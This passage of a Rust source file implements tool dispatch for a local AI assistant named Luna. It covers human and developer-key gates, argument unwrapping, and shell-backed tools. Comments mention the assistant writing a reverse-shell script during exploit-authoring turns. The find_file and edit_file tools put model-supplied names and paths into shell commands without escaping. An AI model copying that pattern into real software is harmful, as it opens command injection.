                              if there's no contact entry. Never invent a recipient — if the \
                              user didn't provide one, ask. If the bridge is offline, tell the \
                              user to run 'luna --whatsapp-link' or check luna-whapp.service.".into(),
                parameters: json!({
                    "type": "object",
                    "properties": {
                        "action": {
                            "type": "string",
                            "enum": ["send", "lookup", "contacts", "frequent", "status"],
                            "description": "send = deliver a message (needs to + text); lookup = report a contact's number by name without sending; contacts = list the contact book (names ↔ numbers); frequent = list contacts texted most recently (~20 days, ranked most-recent first); status = check the bridge is up and linked"
                        },
                        "to": {
                            "type": "string",
                            "description": "full international phone number, digits only (e.g. 15551234567)"
                        },
                        "text": {
                            "type": "string",
                            "description": "the message body to deliver"
                        },
                        "q": {
                            "type": "string",
                            "description": "optional name filter for action=contacts (e.g. 'jane')"
                        },
                        "show_all": {
                            "type": "boolean",
                            "description": "if true, return the complete contact list; otherwise a preview (first 15 entries)"
                        }
                    },
                    "required": ["action"]
                }),
            },
        },
    ]
}

/// Safe subset of tools exposed to the fast tier (qwen3:4b etc.).
///
/// The fast model must be able to RESOLVE "I don't know" cases itself —
/// especially web lookups — without being handed dangerous primitives like
/// `run_shell` or `write_file`. Anything here should be read-only or
/// non-destructive.
pub fn fast_tool_definitions() -> Vec<ToolDef> {
    let safe: &[&str] = &[
        "web_search",
        "fetch_page",
        "read_file",
        "find_file",
        "system_info",
        "process_stats",
        "clipboard",
        "media_info",
        "remember",
        "forget",
        "list_memories",
        "memory_report",
        "notify",
        "set_reminder",
        "list_reminders",
        "cancel_reminder",
        "dns_lookup",
        "see",
    ];
    tool_definitions()
        .into_iter()
        .filter(|t| safe.contains(&t.function.name.as_str()))
        .collect()
}

/// Keys under which models nest the real argument object inside a wrapper.
const ENVELOPE_PAYLOAD_KEYS: &[&str] =
    &["arguments", "args", "parameters", "params", "input", "kwargs"];

/// Keys under which models repeat the tool name inside a wrapper.
const ENVELOPE_NAME_KEYS: &[&str] =
    &["name", "tool", "function", "tool_name", "toolName", "tool_call"];

/// Unwrap the argument envelope, if there is one.
///
/// Measured 2026-10-01 on the security tier: the same model, the same request,
/// produced all three of these shapes across a handful of turns —
///
///   {"path": "/tmp/x.sh", "content": "…"}                    ← the only shape
///   {"function": "write_file", "arguments": {"path": …}}      ← previously ignored
///   {"name": "write_file", "arguments": {"path": …}}          ← previously ignored
///
/// and the wrapped forms were reported as *missing arguments*. The log line for
/// the second shape is unambiguous: it carried `"path":"/tmp/reverse_shell.sh"`
/// and still failed with "write_file was called with no path", because the path
/// was one level down where the arm could not see it. Five identical failures in
/// a row on a request that was, in fact, fully specified.
///
/// Done here, at the single dispatch chokepoint, rather than in each arm, so
/// that the fix cannot be forgotten by a tool added later. That matters: the
/// wrong-envelope bug is invisible at the call site and identical in symptom to
/// a model that simply left an argument out, which is the one case where failing
/// loudly is correct.
///
/// Conservative on purpose, because a tool call is executed. To unwrap, all of
/// the following must hold:
///   - the wrapper names a tool that is actually registered, and
///   - the wrapper carries *only* wrapper keys — a payload key plus a name key —
///     so a genuine argument set that happens to include `name` (`allow_autokill`,
///     `use_skill`, `create_skill`) can never be unwrapped by mistake, and
///   - the payload is a non-empty object, or a string that parses as one.
///
/// A wrapper that fails any of these is passed through untouched, and the arm
/// reports what it is actually missing.
pub fn normalise_tool_args<'a>(args: &'a serde_json::Value) -> Cow<'a, serde_json::Value> {
    let Some(obj) = args.as_object() else {
        return Cow::Borrowed(args);
    };

    // Every key must be a wrapper key. `write_file` has `path`/`content`, so a
    // real argument set almost never qualifies; that asymmetry is the guard.
    if obj
        .keys()
        .any(|k| !ENVELOPE_PAYLOAD_KEYS.contains(&k.as_str()) && !ENVELOPE_NAME_KEYS.contains(&k.as_str()))
    {
        return Cow::Borrowed(args);
    }

    // The named tool must exist. Without this, any `{"name": "x", "input": …}`
    // would be unwrapped, and a wrapper naming a tool that does not exist is a
    // malformed call we want to see as-is.
    let names_a_tool = ENVELOPE_NAME_KEYS.iter().any(|k| {
        obj.get(*k)
            .and_then(|v| v.as_str())
            .map(|n| is_registered_tool(n))
            .unwrap_or(false)
    });
    if !names_a_tool {
        return Cow::Borrowed(args);
    }

    for key in ENVELOPE_PAYLOAD_KEYS {
        match obj.get(*key) {
            // The normal wrapped form.
            Some(inner) if inner.is_object() && !inner.as_object().is_some_and(|o| o.is_empty()) => {
                let named = ENVELOPE_NAME_KEYS
                    .iter()
                    .find(|k| obj.contains_key(**k))
                    .and_then(|k| obj.get(*k))
                    .and_then(|v| v.as_str())
                    .unwrap_or("?");
                tracing::debug!(
                    "Unwrapped tool arguments nested under '{}' for {}",
                    key,
                    named
                );
                return Cow::Borrowed(inner);
            }
            // Double-wrapped: the payload is itself a JSON *string*. Models that
            // serialise their own arguments as text do this. Parsed rather than
            // passed through, because the outer object is already known to be a
            // wrapper, so the string is the argument set by elimination.
            Some(inner) if inner.is_string() => {
                if let Some(s) = inner.as_str() {
                    // Strict first, then the raw-newline repair: a serialised
                    // file body carries literal newlines inside the JSON string,
                    // which is invalid JSON and fails to parse outright.
                    let parsed = serde_json::from_str::<serde_json::Value>(s)
                        .ok()
                        .or_else(|| {
                            serde_json::from_str::<serde_json::Value>(
                                &crate::llm::react::escape_raw_newlines_in_strings(s),
                            )
                            .ok()
                        });
                    if let Some(p) = parsed {
                        if p.is_object() && !p.as_object().is_some_and(|o| o.is_empty()) {
                            return Cow::Owned(p);
                        }
                    }
                }
            }
            _ => {}
        }
    }

    Cow::Borrowed(args)
}

/// Is `name` a registered tool?
fn is_registered_tool(name: &str) -> bool {
    tool_definitions()
        .iter()
        .any(|t| t.function.name == name)
}

/// Run a tool, reporting start and finish to `crate::activity`.
///
/// The reporting lives here rather than in the dispatch body for one reason:
/// several tool arms `return Err(..)` early (a missing argument, a refused
/// gate, an unconfigured browser), and an activity feed that goes silent exactly
/// when a tool was refused is worse than none — the user would be left staring at
/// a turn that apparently did nothing, which is indistinguishable from a hang.
/// Wrapping the whole body means refusal is reported as a refusal.
pub async fn execute(tool_call: &ToolCall, config: &crate::config::LunaConfig) -> Result<String> {
    let name = &tool_call.function.name;
    let args = normalise_tool_args(&tool_call.function.arguments);
    let started = Instant::now();
    // `summarise` is what keeps a whole script or file body off the user's
    // terminal: the point is to see that work is happening, not to read it.
    crate::activity::publish(crate::activity::Event::ToolStart {
        name: name.clone(),
        summary: crate::activity::summarise(name, &args),
    });
    let result = dispatch(tool_call, config).await;
    crate::activity::publish(crate::activity::Event::ToolEnd {
        name: name.clone(),
        ok: result.is_ok(),
        elapsed: started,
    });
    result
}

/// The dispatch chokepoint: argument normalisation, both gates, then the arm.
async fn dispatch(tool_call: &ToolCall, config: &crate::config::LunaConfig) -> Result<String> {
    let name = &tool_call.function.name;

    // Normalise the argument envelope ONCE, here, before any arm sees it.
    //
    // Measured 2026-10-01: this model emits the arguments in three different
    // envelopes depending on the draw, and only one of them was understood:
    //
    //   {"path": "...", "content": "..."}                     ← understood
    //   {"function": "write_file", "arguments": {"path": …}}   ← ignored
    //   {"name": "write_file", "arguments": {...}}             ← ignored
    //
    // The wrapped forms looked like a missing argument: five consecutive
    // write_file calls, each carrying a perfectly good path nested one level
    // down, each reported as "write_file was called with no path". Doing this at
    // the chokepoint means no arm has to defend against it, and a future tool
    // cannot forget to.
    let args = &normalise_tool_args(&tool_call.function.arguments);

    tracing::info!("Executing tool: {} with args: {}", name, args);

    // ── Human gate on real-world actions ────────────────────────────────────
    // Placed here, at the single dispatch chokepoint, so no individual tool arm
    // can forget it and no argument can talk its way past it. Deliberately
    // BEFORE any argument parsing: a gated tool must not so much as look at its
    // arguments, let alone act on them.
    if !config.external.allow_external_actions && config.external.is_gated(name) {
        tracing::warn!(
            "Refused '{}': external-action gate is closed (args were not acted on)",
            name
        );
        let alts = config.external.read_only_alternatives(name);
        let alt_line = if alts.is_empty() {
            String::new()
        } else {
            format!(
                "Read-only alternative{} that still work{}: {}.",
                if alts.len() == 1 { "" } else { "s" },
                if alts.len() == 1 { "s" } else { "" },
                alts.join(", ")
            )
        };
        anyhow::bail!(
            "Refused '{}': the human gate for actions that leave this machine is closed.\n\
             This tool sends, closes, posts, or clicks something outside Luna. In the wild a \
             derailed turn used it to close three of the user's real tasks with nobody asking, \
             and a later one created two duplicate tasks when asked only to LIST them. Nothing \
             was changed by this refusal.\n\
             {}\n\
             To let her use it, the USER must set [external] allow_external_actions = true in \
             ~/.config/luna/luna.toml and restart the daemon. You cannot pass an argument to \
             open this, and you must not try to work around it with run_shell.",
            name,
            alt_line
        );
    }

    // ── Developer-signed capability gate ────────────────────────────────────────
    // Placed at the same chokepoint and for the same reason as the gate above:
    // one place, so no arm can forget it and no argument can pass it.
    //
    // Checked AFTER the external gate so a tool that is refused for both reasons
    // reports the one the user has to act on first — and, more importantly, the
    // capability gate's message must never be the *only* thing standing between
    // a turn and a live host, since it is disabled by default and the message
    // would then read as an invitation.
    if config.external.is_capability_gated(name)
        && !crate::unlock::capabilities_active(
            config.external.allow_capability_actions,
            &config.llm.security_dev_public_key,
        )
    {
        let state = crate::unlock::gate_state(
            config.external.allow_capability_actions,
            &config.llm.security_dev_public_key,
        );
        tracing::warn!(
            "Refused '{}': capability gate is {:?} (args were not acted on)",
            name,
            state
        );
        anyhow::bail!(
            "Refused '{}': this one acts on the machine — it probes hosts, rewrites firewall \
             and sysctl state, or edits Luna's own source.\n\
             Nothing was executed and nothing was changed by this refusal.\n\
             Gate state: {}.\n\
             To enable it, the DEVELOPER must do both:\n\
             \x20 1. set [external] allow_capability_actions = true in ~/.config/luna/luna.toml\n\
             \x20 2. run `luna --unlock-security` and enter the developer key (one key unlocks \
             both switches)\n\
             Editing the config alone does nothing: the config is the request, the signed \
             receipt is the authorisation. You cannot pass an argument to open this, and you \
             must not try to reach it through run_shell.",
            name,
            state.as_str()
        );
    }

    let sudo_pass = config.agent.sudo_password.as_deref();

    match name.as_str() {
        "run_shell" => {
            // A missing `command` is a malformed call, not an empty command.
            //
            // It used to fall back to `echo 'no command'`, which returned the
            // literal string "SUCCESS no command". That reads as a successful
            // result, so the model believed it had run something, had nothing
            // to report, and called again — burning the iteration budget until
            // the ReAct loop gave up and `synthesize_answer` printed
            // "Here's what I found:\n\nSUCCESS no command" as its final answer.
            // Measured 5/6 exploit-authoring turns ended that way: the file was
            // written correctly and then Luna answered with a dump of this.
            //
            // Say what actually happened and tell the model to answer instead.
            let Some(command) = args["command"].as_str().filter(|c| !c.trim().is_empty())
            else {
                return Ok("ERROR: run_shell was called with no command. Nothing was \
                    executed. If the task is already complete, reply to the user in \
                    plain text now — do not call another tool."
                    .to_string());
            };
            let result = shell::run_command(command, sudo_pass).await?;
            if result.exit_code == 0 {
                Ok(format!("SUCCESS\n{}", result.stdout.trim()))
            } else {
                Ok(format!(
                    "FAILED (exit {})\nstdout: {}\nstderr: {}",
                    result.exit_code,
                    result.stdout.trim(),
                    result.stderr.trim()
                ))
            }
        }

        "find_file" => {
            let name = args["name"].as_str().unwrap_or("*");
            let path = args["search_path"].as_str().unwrap_or("~");
            let expanded = path.replace('~', &std::env::var("HOME").unwrap_or_default());
            let result = shell::run_command(
                &format!(
                    "find '{}' -name '{}' 2>/dev/null | head -10",
                    expanded, name
                ),
                sudo_pass,
            )
            .await?;
            if result.stdout.trim().is_empty() {
                Ok(format!("'{}' not found", name))
            } else {
                Ok(result.stdout.trim().to_string())
            }
        }

        "nmap_scan" => {
            let target = args["target"].as_str().unwrap_or("");
            let scan_type = args["scan_type"].as_str().unwrap_or("quick");
            if target.is_empty() {
                anyhow::bail!("No target provided");
            }
            security::nmap_scan(
                target,
                scan_type,
                sudo_pass,
                &config.llm.scan_allowlist,
            )
            .await
        }

        "analyze_pcap" => {
            let path = args["path"].as_str().unwrap_or("");
            let mode = args["mode"].as_str().unwrap_or("summary");
            security::analyze_pcap(path, mode, sudo_pass).await
        }

        "decode_payload" => {
            let data = args["data"].as_str().unwrap_or("");
            let encoding = args["encoding"].as_str().unwrap_or("auto");
            security::decode_payload(data, encoding, sudo_pass).await
        }

        "hash_file" => {
            let path = args["path"].as_str().unwrap_or("");
            let algo = args["algo"].as_str().unwrap_or("sha256");
            security::hash_file(path, algo, sudo_pass).await
        }

        "dns_lookup" => {
            let target = args["target"].as_str().unwrap_or("");
            let mode = args["mode"].as_str().unwrap_or("dns");
            security::dns_lookup(target, mode, sudo_pass).await
        }

        "edit_file" => {
            let path = args["path"].as_str().unwrap_or("");
            let expanded = path.replace('~', &std::env::var("HOME").unwrap_or_default());
            let open_in_gui = args["open_in_gui"].as_bool().unwrap_or(false);
            let old_str = args["old_str"].as_str();
            let new_str = args["new_str"].as_str();
            let content = args["content"].as_str();

            if open_in_gui || (old_str.is_none() && new_str.is_none() && content.is_none()) {
                shell::run_command(&format!("zeditor {} &", expanded), sudo_pass).await?;
                Ok("Opened in editor".to_string())
            } else {
                if let Some(reason) = selfpatch::blocks_raw_write(&config.selfpatch, &expanded) {
                    return Err(anyhow::anyhow!(reason));
                }
                filesystem::edit_file(&expanded, old_str, new_str, content).await
            }
        }

        "web_search" => {
            let query = args["query"].as_str().unwrap_or("");
            web::search(
                query,
                config.search.tavily_api_key.as_deref(),
                config.search.gemini_api_key.as_deref(),
            )
            .await
        }

        "read_file" => {
            // Same defect as write_file/run_shell: a missing `path` used to
            // read /dev/null, which is empty, so the model received "" and
            // concluded the file did not exist.
            let Some(path) = args["path"].as_str().filter(|p| !p.trim().is_empty()) else {
                return Err(anyhow::anyhow!(
                    "read_file was called with no path. Re-issue with an explicit `path`."
                ));
            };
            let expanded = path.replace('~', &std::env::var("HOME").unwrap_or_default());
            filesystem::read_file(&expanded).await
        }

        "write_file" => {
            // Same class of bug as run_shell above: a missing `path` used to
            // default to "/dev/null", the write was discarded, and the tool
            // still returned "Written to /dev/null". That is a fabricated
            // success — the exact failure this tier's tool-discipline rule
            // exists to prevent. Observed once in six exploit-authoring turns,
            // where the model omitted `path` and Luna cheerfully reported
            // writing to /dev/null instead of the requested file.
            let Some(path) = args["path"].as_str().filter(|p| !p.trim().is_empty()) else {
                return Err(anyhow::anyhow!(
                    "write_file was called with no path. Nothing was written. \
                     Re-issue the call with an explicit `path` argument."
                ));
            };
            let content = args["content"].as_str().unwrap_or("");
            let expanded = path.replace('~', &std::env::var("HOME").unwrap_or_default());
            // Her own source must go through the self_patch gate, not a raw write.
            if let Some(reason) = selfpatch::blocks_raw_write(&config.selfpatch, &expanded) {
                return Err(anyhow::anyhow!(reason));
            }
            // Models sometimes double-escape newlines, producing a file that
            // looks right in a diff and cannot be run. Repaired here rather
            // than after the fact, and only when the repaired form is provably
            // valid — see `tools::verify`.
            let (content, repair_note) = match verify::check_before_write(&expanded, content) {
                verify::PreWrite::Clean => (content.to_string(), None),
                verify::PreWrite::Repaired(fixed) => {
                    tracing::warn!(
                        "Repaired double-escaped newlines in {expanded} — the file as written \
                         did not parse"
                    );
                    (
                        fixed,
                        Some(format!(
                            "\nNote: the file was written with escaped newlines (`\\n` as text) \
                             and did not parse. Newlines were repaired and the result verified. \
                             If the content looks wrong, ask for it again."
                        )),
                    )
                }
                verify::PreWrite::StillBroken(orig) => {
                    tracing::warn!(
                        "{expanded} has escaped newlines and does not parse even after \
                         repairing them — writing it unchanged and saying so"
                    );
                    (
                        orig,
                        Some(format!(
                            "\nNote: the file at {expanded} was written with escaped newlines \
                             and does not parse. It was NOT modified — a guess would be worse \
                             than a file that is visibly broken. Re-ask for the script."
                        )),
                    )
                }
            };
            filesystem::write_file(&expanded, &content).await?;
            Ok(match repair_note {
                Some(note) => format!("Written to {expanded}{note}"),
                None => format!("Written to {expanded}"),
            })
        }

        "notify" => {
            let title = args["title"].as_str().unwrap_or("Luna");
            let body = args["body"].as_str().unwrap_or("");
            desktop::notify(title, body, sudo_pass).await?;
            Ok("Notification sent".into())
        }

        "system_info" => {
            let query = args["query"].as_str().unwrap_or("all");
            let cmd = match query {
                "battery" => "cat /sys/class/power_supply/BAT0/capacity 2>/dev/null | xargs -I{} echo 'Battery: {}%'; cat /sys/class/power_supply/BAT0/status 2>/dev/null | xargs -I{} echo 'Status: {}'".to_string(),
                "cpu"     => "top -bn1 | grep 'Cpu(s)' | awk '{print \"CPU: \" $2+$4 \"%\"}'".to_string(),
                "ram"     => "free -h | awk '/^Mem:/ {print \"RAM: \" $3 \"/\" $2}'".to_string(),
                "temp"    => "sensors 2>/dev/null | grep -E 'Core|Tdie|temp' | head -5 || echo 'sensors not installed'".to_string(),
                "disk"    => "df -h / | awk 'NR>1 {print \"/: \" $3 \"/\" $2 \" (\" $5 \")\"}'".to_string(),
                "uptime"  => "uptime -p".to_string(),
                _         => "cat /sys/class/power_supply/BAT0/capacity 2>/dev/null | xargs -I{} echo 'Battery: {}%'; free -h | awk '/^Mem:/ {print \"RAM: \" $3 \"/\" $2}'; uptime -p; df -h / | awk 'NR>1 {print \"/: \" $3 \"/\" $2}'".to_string(),
            };
            let result = shell::run_command(&cmd, sudo_pass).await?;
            Ok(result.stdout.trim().to_string())
        }

        "clipboard" => {
            let action = args["action"].as_str().unwrap_or("read");
            match action {
                "write" => {
                    let content = args["content"].as_str().unwrap_or("");
                    let cmd = format!("printf '%s' '{}' | wl-copy", content.replace('\'', "'\\''"));
                    shell::run_command(&cmd, sudo_pass).await?;
                    Ok("Copied to clipboard".to_string())
                }
                _ => {
                    let result = shell::run_command(
                        "wl-paste 2>/dev/null || xclip -o 2>/dev/null || echo 'clipboard empty'",
                        sudo_pass,
                    )
                    .await?;
                    Ok(result.stdout.trim().to_string())
                }
            }
        }

        "fetch_page" => {
            let url = args["url"].as_str().unwrap_or("");
            if url.is_empty() {
                anyhow::bail!("No URL provided");
            }
            // Try Firecrawl keyless first (handles JS-rendered pages)
            match fetch_page_firecrawl(url).await {
                Ok(text) => Ok(text),
                Err(e) => {
                    tracing::warn!("Firecrawl failed for {}: {}", url, e);
                    // Fallback: curl + sed (no JS support)
                    let safe_url = url.replace('\'', "'\\''");
                    let cmd = format!(
                        "curl -sL --max-time 10 \
                            --user-agent 'Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0' \
                            '{}' \
                         | sed 's/<[^>]*>//g' | sed '/^[[:space:]]*$/d' | head -200",
                        safe_url
                    );
                    let result = shell::run_command(&cmd, sudo_pass).await?;
                    if result.stdout.trim().is_empty() {
                        Ok("Could not fetch page".to_string())
                    } else {
                        let text = result.stdout.trim();
                        let truncated = text
                            .char_indices()
                            .take_while(|(i, _)| *i < 4000)
                            .last()
                            .map(|(i, c)| &text[..i + c.len_utf8()])
                            .unwrap_or(text);
                        Ok(truncated.to_string())
                    }
                }
            }
        }

        "remember" => {
            let fact = args["fact"].as_str().unwrap_or("").to_string();
            let category = args["category"].as_str().unwrap_or("general").to_string();
            let mut pm = crate::memory::permanent::PermanentMemory::load()?;
            pm.remember(&fact, &category)
        }

        "forget" => {
            let keyword = args["keyword"].as_str().unwrap_or("");
            let mut pm = crate::memory::permanent::PermanentMemory::load()?;
            pm.forget(keyword)
        }

        "todoist_list" => {
            let token = config.todoist.api_token.as_deref().ok_or_else(|| {
                anyhow::anyhow!(
                    "Todoist not configured — add api_token to luna.toml under [todoist]"
                )
            })?;
            let filter = args["filter"].as_str().filter(|s| !s.is_empty());
            crate::tools::todoist::list_tasks(token, filter).await
        }

        "todoist_add" => {
            let token = config
                .todoist
                .api_token
                .as_deref()
                .ok_or_else(|| anyhow::anyhow!("Todoist not configured"))?;
            let content = args["content"].as_str().unwrap_or("");
            let due = args["due"].as_str().filter(|s| !s.is_empty());
            crate::tools::todoist::add_task(token, content, due).await
        }

        "todoist_complete" => {
            let token = config
                .todoist
                .api_token
                .as_deref()
                .ok_or_else(|| anyhow::anyhow!("Todoist not configured"))?;
            let task = args["task"].as_str().unwrap_or("");
            crate::tools::todoist::complete_task(token, task).await
        }

        "spotify" => {
            let action = args["action"].as_str().unwrap_or("");
            crate::tools::spotify::run(action, args, config).await
        }

        "list_memories" => {
            let pm = crate::memory::permanent::PermanentMemory::load()?;
            Ok(pm.list())
        }

        "create_skill" => {
            let name = args["name"].as_str().unwrap_or("");
            let description = args["description"].as_str().unwrap_or("");
            let procedure = args["procedure"].as_str().unwrap_or("");
            crate::memory::skills::create(name, description, procedure)
        }

        "use_skill" => {
            let name = args["name"].as_str().unwrap_or("");
            crate::memory::skills::read(name)
        }

        "list_skills" => Ok(crate::memory::skills::list_and_format()),

        "forget_skill" => {
            let name = args["name"].as_str().unwrap_or("");
            crate::memory::skills::forget(name)
        }

        "search_history" => {
            let query = args["query"].as_str().unwrap_or("");
            Ok(crate::agent::learning::search_history(query))
        }

        "index_system" => {
            let summary = crate::memory::workflow::run_index_system(sudo_pass).await?;
            if summary.is_empty() {
                Ok("Nothing found to index".to_string())
            } else {
                Ok(format!("Indexed: {}", summary.join(", ")))
            }
        }

        "learn_topic" => {
            let topic = args["topic"].as_str().unwrap_or("");
            if topic.is_empty() {
                anyhow::bail!("No topic provided");
            }
            learn::learn(
                topic,
                sudo_pass,
                config.search.tavily_api_key.as_deref(),
                config.search.gemini_api_key.as_deref(),
            )
            .await
        }

        "process_stats" => {
            let tracker = crate::daemon::tracker::Tracker::load();
            let stats = tracker.stats_snapshot();
            if stats.is_empty() {
                return Ok(
                    "No process learning data yet — the daemon hasn't completed a scan cycle."
                        .into(),
                );
            }
            let allowlist: std::collections::HashSet<String> =
                crate::daemon::tracker::load_allowlist()
                    .into_iter()
                    .collect();
            let protected = config.daemon.protected_processes.clone();

            let mut rows: Vec<String> = stats
                .iter()
                .map(|(name, s)| {
                    let days_14 = {
                        let cutoff = (chrono::Local::now() - chrono::Duration::days(14))
                            .format("%Y-%m-%d")
                            .to_string();
                        s.days_seen
                            .iter()
                            .filter(|d| d.as_str() > cutoff.as_str())
                            .count()
                    };
                    let status = if tracker.is_important(name) {
                        "important (learned)"
                    } else if protected.iter().any(|p| p == name) {
                        "protected"
                    } else if allowlist.contains(name) {
                        "auto-kill allowed"
                    } else {
                        "-"
                    };
                    format!(
                        "{:<24} {}/14d  active {} cyc  idle {} cyc  {:>6} jiffies  {}",
                        name, days_14, s.active_cycles, s.idle_cycles, s.total_jiffies, status
                    )
                })
                .collect();
            rows.sort();

            Ok(format!(
                "Process usage ({} tracked, daemon scans every {} min):\n{}",
                stats.len(),
                config.daemon.check_interval_mins,
                rows.join("\n")
            ))
        }

        "see" => {
            let target = args["target"].as_str().unwrap_or("screen");
            match target {
                "browser" => crate::tools::eyes::see_browser(config).await,
                _ => crate::tools::eyes::see_screen(config).await,
            }
        }

        "allow_autokill" => {
            let name = args["name"].as_str().unwrap_or("");
            if name.is_empty() {
                anyhow::bail!("No process name provided");
            }
            crate::daemon::tracker::allowlist_add(name)?;
            tracing::info!("Auto-kill allowed for '{}'", name);
            Ok(format!(
                "Allowed. The daemon will end '{}' after ~{} min idle (unless it's a \
                 daily-use or protected app). Say 'deny auto-kill {}' to revoke.",
                name, config.daemon.idle_kill_minutes, name
            ))
        }

        "deny_autokill" => {
            let name = args["name"].as_str().unwrap_or("");
            if name.is_empty() {
                anyhow::bail!("No process name provided");
            }
            crate::daemon::tracker::allowlist_remove(name)?;
            // Teach the learner: this app matters to the user, keep it safe.
            crate::daemon::tracker::persist_keep(name)?;
            tracing::info!("Learned to keep '{}' — never auto-kill or suggest it again", name);
            Ok(format!(
                "Understood — '{}' is marked as important. It won't be auto-killed or \
                 kill-suggested again.",
                name
            ))
        }

        "set_reminder" => {
            let text = args["text"].as_str().unwrap_or("");
            let minutes = args["minutes"].as_u64();
            let at_time = args["at_time"].as_str();
            let r = if let Some(mins) = minutes {
                crate::tools::reminders::add_in(mins.min(u32::MAX as u64) as u32, text)?
            } else if let Some(t) = at_time {
                crate::tools::reminders::add_at(t, text)?
            } else {
                anyhow::bail!("Need either 'minutes' or 'at_time'");
            };
            let when = local_fmt(r.fire_at, "%a %H:%M");
            Ok(format!(
                "Reminder set (id {}): '{}' fires {}",
                r.id, r.text, when
            ))
        }

        "list_reminders" => {
            let all = crate::tools::reminders::list();
            if all.is_empty() {
                return Ok("No pending reminders.".into());
            }
            let rows: Vec<String> = all
                .iter()
                .map(|r| {
                    format!(
                        "#{}  {}  {}",
                        r.id,
                        local_fmt(r.fire_at, "%a %d %b %H:%M"),
                        r.text
                    )
                })
                .collect();
            Ok(rows.join("\n"))
        }

        "cancel_reminder" => {
            let id = args["id"].as_u64().unwrap_or(0);
            match crate::tools::reminders::cancel(id)? {
                true => Ok(format!("Cancelled reminder #{}.", id)),
                false => Ok(format!("No reminder with id {}.", id)),
            }
        }

        "memory_report" => {
            use std::collections::BTreeMap;
            let pm = crate::memory::permanent::PermanentMemory::load()?;
            let facts = pm.all_facts();

            let mut by_cat: BTreeMap<&str, Vec<&str>> = BTreeMap::new();
            for f in facts {
                by_cat
                    .entry(f.category.as_str())
                    .or_default()
                    .push(&f.content);
            }

            let mut out = String::from("What Luna has permanently learned:\n");
            for (cat, items) in &by_cat {
                out.push_str(&format!("\n[{}] {}\n", cat, items.len()));
                for c in items.iter().take(15) {
                    out.push_str(&format!("  - {}\n", c));
                }
                if items.len() > 15 {
                    out.push_str(&format!("  ... and {} more\n", items.len() - 15));
                }
            }
            out.push_str(
                "\n(These facts ARE the answer to the user's question — present them \
                 clearly now. Do not ask what they want to do next.)\n",
            );
            Ok(out)
        }

        "media_info" => {
            // Use gdbus (GIO) — dbus-send is broken on some Arch builds.
            // Query Spotify first, then fall back to any active MPRIS player.
            let script = r#"
# Try Spotify first
OUT=$(gdbus call --session --dest org.mpris.MediaPlayer2.spotify \
  --object-path /org/mpris/MediaPlayer2 \
  --method org.freedesktop.DBus.Properties.Get \
  org.mpris.MediaPlayer2.Player Metadata 2>/dev/null)

# If that failed, find any MediaPlayer2 bus
if [ -z "$OUT" ]; then
    for bus in $(gdbus call --session --dest org.freedesktop.DBus \
      --object-path /org/freedesktop/DBus \
      --method org.freedesktop.DBus.ListNames 2>/dev/null | \
      tr "'" "\n" | grep MediaPlayer2); do
        OUT=$(gdbus call --session --dest "$bus" \
          --object-path /org/mpris/MediaPlayer2 \
          --method org.freedesktop.DBus.Properties.Get \
          org.mpris.MediaPlayer2.Player Metadata 2>/dev/null)
        [ -n "$OUT" ] && break
    done
fi

[ -z "$OUT" ] && echo "NO_PLAYER" && exit 0

# Parse GVariant output — extract title, artist, album
TITLE=$(echo "$OUT" | grep -oP "xesam:title': <'\K[^']+")
ARTIST=$(echo "$OUT" | grep -oP "xesam:artist': <\['\K[^']+")
ALBUM=$(echo "$OUT" | grep -oP "xesam:album': <'\K[^']+")
STATUS=$(gdbus call --session --dest org.mpris.MediaPlayer2.spotify \
  --object-path /org/mpris/MediaPlayer2 \
  --method org.freedesktop.DBus.Properties.Get \
  org.mpris.MediaPlayer2.Player PlaybackStatus 2>/dev/null | \
  grep -oP "'\\K[^']+" || echo "Unknown")

echo "TITLE=$TITLE"
echo "ARTIST=$ARTIST"
echo "ALBUM=$ALBUM"
echo "STATUS=$STATUS"
"#;
            let result = shell::run_command(script.trim(), sudo_pass).await?;
            let stdout = result.stdout.trim().to_string();
            if stdout.contains("NO_PLAYER") || stdout.is_empty() {
                Ok("No media player found running. Start Spotify or another \
                    MPRIS-compatible player first."
                    .into())
            } else {
                // Parse KEY=VALUE lines into a readable sentence
                let mut title = String::new();
                let mut artist = String::new();
                let mut album = String::new();
                let mut status = String::new();
                for line in stdout.lines() {
                    if let Some(v) = line.strip_prefix("TITLE=") {
                        title = v.to_string();
                    } else if let Some(v) = line.strip_prefix("ARTIST=") {
                        artist = v.to_string();
                    } else if let Some(v) = line.strip_prefix("ALBUM=") {
                        album = v.to_string();
                    } else if let Some(v) = line.strip_prefix("STATUS=") {
                        status = v.to_string();
                    }
                }
                let mut out = format!("Now playing: {} by {}", title, artist);
                if !album.is_empty() {
                    out.push_str(&format!(" (album: {})", album));
                }
                out.push_str(&format!(" [{}]", status));
                Ok(out)
            }
        }

        "set_debug" => {
            let level = args["level"].as_str().unwrap_or("info");
            let new_level = match level {
                "on" | "debug" => "debug",
                "off" | "info" => "info",
                other => {
                    anyhow::bail!(
                        "Invalid level '{}' — use 'on', 'off', 'debug', or 'info'",
                        other
                    );
                }
            };
            let mut cfg = crate::config::LunaConfig::load()?;
            cfg.logging.level = new_level.to_string();
            cfg.save()?;
            Ok(format!(
                "Logging set to '{}'. Restart Luna for the change to take effect.",
                new_level
            ))
        }

        "self_patch" => {
            let action = args["action"].as_str().unwrap_or("status");
            let sp = &config.selfpatch;
            match action {
                "propose" => {
                    // Accept several shapes, because a 7B mixes them up:
                    //   changes: [{file, line_edits:[{at_line, replace_with}]}]  <- most reliable
                    //   changes: [{file, edits:[{find, replace}]}]                <- exact text
                    //   changes: [{file, content: "<full file>"}]                 <- small files
                    //   flat {file, content}                                      <- fallback
                    fn spec(c: &serde_json::Value) -> Option<selfpatch::ChangeSpec> {
                        let f = c["file"].as_str()?;
                        let content = c["content"].as_str().map(|s| s.to_string());
                        let mut edits: Vec<(String, String)> = Vec::new();
                        if let Some(arr) = c["edits"].as_array() {
                            for e in arr {
                                if let (Some(a), Some(b)) =
                                    (e["find"].as_str(), e["replace"].as_str())
                                {
                                    edits.push((a.to_string(), b.to_string()));
                                }
                            }
                        }
                        // Line-anchored shape. Also read `at_line`/`replace_with`
                        // from inside `edits` — a 7B often puts the line anchor
                        // in the edits array rather than a separate one.
                        let mut line_edits: Vec<(usize, String)> = Vec::new();
                        for key in ["line_edits", "edits"] {
                            if let Some(arr) = c[key].as_array() {
                                for e in arr {
                                    let line = e["at_line"]
                                        .as_u64()
                                        .or_else(|| e["line"].as_u64());
                                    let rep = e["replace_with"]
                                        .as_str()
                                        .or_else(|| e["replace"].as_str());
